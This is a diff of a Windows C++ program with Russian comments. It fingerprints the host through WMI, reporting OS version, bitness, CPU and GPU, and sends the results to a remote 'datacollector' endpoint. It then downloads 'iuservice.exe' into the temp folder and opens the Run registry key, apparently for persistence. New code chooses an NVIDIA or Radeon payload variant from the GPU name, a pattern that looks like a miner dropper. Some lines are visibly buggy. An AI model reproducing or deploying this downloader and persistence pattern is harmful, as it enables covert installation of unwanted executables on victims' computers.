@@ -3,10 +3,9 @@
 #include "windows.h"
 #include <wininet.h>
 #include <fstream>
-#include <atlstr.h> //MayBeLater
+#include <atlstr.h>
 #include <urlmon.h>
 #include <tlhelp32.h>
-#include <Wincrypt.h> //MayBeLater
 #include <WbemCli.h>
 #include <VersionHelpers.h>
 #include <string>
@@ -14,173 +13,6 @@
 #pragma comment(lib, "wbemuuid.lib")  
 #pragma comment(lib, "urlmon.lib")
 #pragma comment(lib,"wininet")
-
-//#define BUFSIZE 1024
-//#define MD5LEN  16
-
-
-#pragma region MayBeNeededLater/*
-//Определение битности. Взял кусок кода отсюда: https://support.microsoft.com/en-gb/kb/2060044
-
-
-std::string readHashFromFile(const char* filepath)
-{
-	char chh;
-	std::string res = "00112233445566778899aabbccddeeff";
-	std::ifstream txtfile("serviceapp.txt");
-	if (txtfile.is_open())
-	{
-		std::cout << "open\n";
-		while (txtfile.get(chh))
-			std::cout << chh << "lol";
-		system("pause");
-	}
-	for (int i = 0; i < 32; ++i)
-	{
-
-		res[i] = txtfile.get();
-		std::cout << res[i] << " " << txtfile.get();
-		system("pause"); 
-	}
-	return res;
-}
-
-
-
-//md5 файла
-std::string Filemd5(const CString& nameOfFile)
-{
-	std::string resmd5 = "00112233445566778899aabbccddeeff"; // костыли&велосипеды вперде
-	DWORD dwStatus = 0;
-	BOOL bResult = FALSE;
-	HCRYPTPROV hProv = 0;
-	HCRYPTHASH hHash = 0;
-	HANDLE hFile = NULL;
-	BYTE rgbFile[BUFSIZE];
-	DWORD cbRead = 0;
-	BYTE rgbHash[MD5LEN];
-	DWORD cbHash = 0;
-	CHAR rgbDigits[] = "0123456789abcdef";
-	LPCWSTR filename = (LPCTSTR)nameOfFile;
-	// Logic to check usage goes here.
-
-	hFile = CreateFile(filename,
-		GENERIC_READ,
-		FILE_SHARE_READ,
-		NULL,
-		OPEN_EXISTING,
-		FILE_FLAG_SEQUENTIAL_SCAN,
-		NULL);
-
-	if (INVALID_HANDLE_VALUE == hFile)
-	{
-		dwStatus = GetLastError();
-		printf("Error opening file %s\nError: %d\n", filename,
-			dwStatus);
-		return (char*)dwStatus;
-	}
-
-	// Get handle to the crypto provider
-	if (!CryptAcquireContext(&hProv,
-		NULL,
-		NULL,
-		PROV_RSA_FULL,
-		CRYPT_VERIFYCONTEXT))
-	{
-		dwStatus = GetLastError();
-		printf("CryptAcquireContext failed: %d\n", dwStatus);
-		CloseHandle(hFile);
-		return (char*)dwStatus;
-	}
-
-	if (!CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash))
-	{
-		dwStatus = GetLastError();
-		printf("CryptAcquireContext failed: %d\n", dwStatus);
-		CloseHandle(hFile);
-		CryptReleaseContext(hProv, 0);
-		return (char*)dwStatus;
-	}
-
-	while (bResult = ReadFile(hFile, rgbFile, BUFSIZE,
-		&cbRead, NULL))
-	{
-		if (0 == cbRead)
-		{
-			break;
-		}
-
-		if (!CryptHashData(hHash, rgbFile, cbRead, 0))
-		{
-			dwStatus = GetLastError();
-			printf("CryptHashData failed: %d\n", dwStatus);
-			CryptReleaseContext(hProv, 0);
-			CryptDestroyHash(hHash);
-			CloseHandle(hFile);
-			return (char*)dwStatus;
-		}
-	}
-
-	if (!bResult)
-	{
-		dwStatus = GetLastError();
-		printf("ReadFile failed: %d\n", dwStatus);
-		CryptReleaseContext(hProv, 0);
-		CryptDestroyHash(hHash);
-		CloseHandle(hFile);
-		return (char*)dwStatus;
-	}
-
-	cbHash = MD5LEN;
-	if (CryptGetHashParam(hHash, HP_HASHVAL, rgbHash, &cbHash, 0))
-	{
-		//printf("MD5 hash of file %s is: ", filename);
-		for (unsigned int i = 0; i < cbHash; i++)
-		{
-			//printf("%c%c", rgbDigits[rgbHash[i] >> 4],
-				//rgbDigits[rgbHash[i] & 0xf]);
-			resmd5[2 * i] = rgbDigits[rgbHash[i] >> 4];
-			//std::cout << resmd5[2*i];
-			resmd5[2 * i + 1] = rgbDigits[rgbHash[i] & 0xf];
-		}
-		printf("\n");
-	}
-	else
-	{
-		dwStatus = GetLastError();
-		printf("CryptGetHashParam failed: %d\n", dwStatus);
-	}
-
-	CryptDestroyHash(hHash);
-	CryptReleaseContext(hProv, 0);
-	CloseHandle(hFile);
-	//std::cout << resmd5;
-	return resmd5;
-}
-
-bool ProcessRunning(const WCHAR* name)
-{
-	HANDLE SnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-
-	if (SnapShot == INVALID_HANDLE_VALUE)
-		return false;
-
-	PROCESSENTRY32 procEntry;
-	procEntry.dwSize = sizeof(PROCESSENTRY32);
-
-	if (!Process32First(SnapShot, &procEntry))
-		return false;
-
-	do
-	{
-		if (wcscmp(procEntry.szExeFile, name) == 0)
-			return true;
-	} while (Process32Next(SnapShot, &procEntry));
-
-	return false;
-}
-*/
-#pragma endregion
 
 #pragma region Is64BitOperatingSystem()
 //   FUNCTION: DoesWin32MethodExist(PCWSTR, PCSTR)
@@ -322,7 +154,7 @@ std::wstring readServiceUrl()
 
 //Чтение ссылок на exe приложений и сохранение id, названия, ссылки и md5 в файл listapp.txt для каждого приложения
 //Работает только с небольшим количеством ссылок (точно не больше 10, но лучше меньше (сейчас 8)), после последней ссылки на сайте должно быть 2 '\n'
-//Для большего количества надо увеличить количество чаров в szData и поменять восьмёрку в начале этой фугкции и в цикле мейна.
+//Для большего количества надо увеличить количество чаров в szData и поменять восьмёрку в начале этой функции и в цикле мейна.
 std::wstring* readAppsUrls(const std::string version)
 {
 	std::wstring* result = new std::wstring[8]; //8 ссылок
@@ -439,8 +271,8 @@ std::wstring* readAppsUrls(const std::string version)
 	return result;
 }
 
-//POST запрос (sort of). Для того, чтобы работало, надо убрать 123 в открытии запроса
-int postInfo(const std::string version)
+//POST запрос (sort of).
+std::string postInfo(const std::string version)
 {
 	//Узнаём процессор у видюху
 	std::wstring wver(version.begin(), version.end());
@@ -450,18 +282,18 @@ int postInfo(const std::string version)
 	if (FAILED(hRes))
 	{
 		//std::cout << "Unable to launch COM: 0x" << std::hex << hRes << std::endl;
-		return 1;
+		return "";
 	}
 	if ((FAILED(hRes = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_CONNECT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, 0))))
 	{
 		//std::cout << "Unable to initialize security: 0x" << std::hex << hRes << std::endl;
-		return 1;
+		return "";
 	}
 	IWbemLocator* pLocator = NULL;
 	if (FAILED(hRes = CoCreateInstance(CLSID_WbemLocator, NULL, CLSCTX_ALL, IID_PPV_ARGS(&pLocator))))
 	{
 		//std::cout << "Unable to create a WbemLocator: " << std::hex << hRes << std::endl;
-		return 1;
+		return "";
 	}
 
 	IWbemServices* pService = NULL;
@@ -469,7 +301,7 @@ int postInfo(const std::string version)
 	{
 		pLocator->Release();
 		//std::cout << "Unable to connect to \"CIMV2\": " << std::hex << hRes << std::endl;
-		return 1;
+		return "";
 	}
 
 	IEnumWbemClassObject* pEnumerator = NULL;
@@ -478,7 +310,7 @@ int postInfo(const std::string version)
 		pLocator->Release();
 		pService->Release();
 		//std::cout << "Unable to retrive processor: " << std::hex << hRes << std::endl;
-		return 1;
+		return "";
 	}
 
 	IWbemClassObject* clsObj = NULL;
@@ -514,11 +346,13 @@ int postInfo(const std::string version)
 		pLocator->Release();
 		pService->Release();
 		//std::cout << "Unable to retrive video controller: " << std::hex << hRes << std::endl;
-		return 1;
+		return "";
 	}
 
 	clsObj = NULL;
 	numElems;
+	bool mainVideoControllerRead = FALSE;
+	std::string videoController;
 	while ((hRes = pEnumerator->Next(WBEM_INFINITE, 1, &clsObj, (ULONG*)&numElems)) != WBEM_S_FALSE)
 	{
 		if (FAILED(hRes))
@@ -530,6 +364,15 @@ int postInfo(const std::string version)
 		{
 			Info += L"Video controller name:";
 			Info += vRet.bstrVal;
+			if (mainVideoControllerRead == FALSE)
+			{
+				std::wstring tmpstr = vRet.bstrVal;
+				if (tmpstr.c_str()[0] == L'N' || tmpstr.c_str()[0] == L'n')
+					videoController = "_nvidia";
+				else
+					videoController = "_radeon";
+				mainVideoControllerRead = TRUE;
+			}
 			Info += L",";
 			VariantClear(&vRet);
 		}
@@ -541,7 +384,6 @@ int postInfo(const std::string version)
 	pEnumerator->Release();
 	pService->Release();
 	pLocator->Release();
-	//std::wcout << Info.c_str() << "\t" << sizeof(WCHAR)*Info.length() << std::endl;
 
 	// инициализируем WinInet
 	HINTERNET hInternet =
@@ -568,7 +410,7 @@ int postInfo(const std::string version)
 				::HttpOpenRequest(
 				hConnect,
 				TEXT("GET"),
-				TEXT("/iuservice/datacollector123/"), //здесь убрать 123
+				TEXT("/iuservice/datacollector/"), //здесь убрать 123
 				NULL,
 				NULL,
 				NULL,
@@ -592,7 +434,7 @@ int postInfo(const std::string version)
 		::InternetCloseHandle(hInternet);
 	}
 
-	return 0;
+	return videoController;
 }
 
 //Установка и запуск сервиса
@@ -652,29 +494,9 @@ BOOL InstallAndStartService(const CString& strServiceName, const CString& strDis
 }*/
 
 //Получение версии винды
-std::string getVersion()
+std::string getBitVersion()
 {
-	std::string version;
-	if (IsWindowsXPOrGreater())
-	{
-		version = "";
-		version += "xp_";
-	}
-	if (IsWindowsVistaOrGreater())
-	{
-		version = "";
-		version += "vista_";
-	}
-	if (IsWindows7OrGreater())
-	{
-		version = "";
-		version += "7_";
-	}
-	if (IsWindows8OrGreater())
-	{
-		version = "";
-		version += "8_";
-	}
+	std::string version = "";
 	if (Is64BitOperatingSystem)
 		version += "64";
 	else
@@ -682,21 +504,53 @@ std::string getVersion()
 	return version;
 }
 
+std::string getOSVersion()
+{
+	std::string version = "";
+	if (IsWindowsXPOrGreater())
+	{
+	version = "";
+	version += "xp_";
+	}
+	if (IsWindowsVistaOrGreater())
+	{
+	version = "";
+	version += "vista_";
+	}
+	if (IsWindows7OrGreater())
+	{
+	version = "";
+	version += "7_";
+	}
+	if (IsWindows8OrGreater())
+	{
+	version = "";
+	version += "8_";
+	}
+	return version;
+}
+
 int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd)
 //int _tmain(int argc, _TCHAR* argv[])
 {
-	std::string version = getVersion();
+	std::string version = getOSVersion()+getBitVersion();
+	std:: string videoVersion = postInfo(version);
+	version = getBitVersion() + videoVersion;
 	std::wstring serviceUrl = readServiceUrl();
 	std::wstring* allUrls = readAppsUrls(version);
 	std::wstring appName;
 	std::wstring appUrl;
-	postInfo(version);
-	TCHAR szPath[MAX_PATH];
-	GetModuleFileName(NULL, szPath, MAX_PATH);
+	//TCHAR szPath[MAX_PATH];
+	//GetModuleFileName(NULL, szPath, MAX_PATH);
 	HKEY newValue;
 	TCHAR szTempPathBuffer[MAX_PATH];
 	GetTempPath(MAX_PATH, szTempPathBuffer);
 	std::wstring filePath = szTempPathBuffer;
+	filePath += L"\iuurl.txt";
+	std::ofstream urlFile(filePath);
+	urlFile << version;
+	urlFile.close();
+	filePath = szTempPathBuffer;
 	filePath += L"\iuservice.exe";
 	HRESULT hr1 = URLDownloadToFile(NULL, serviceUrl.c_str(), filePath.c_str(), 0, NULL);
 	RegOpenKey(HKEY_CURRENT_USER, _T("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &newValue);
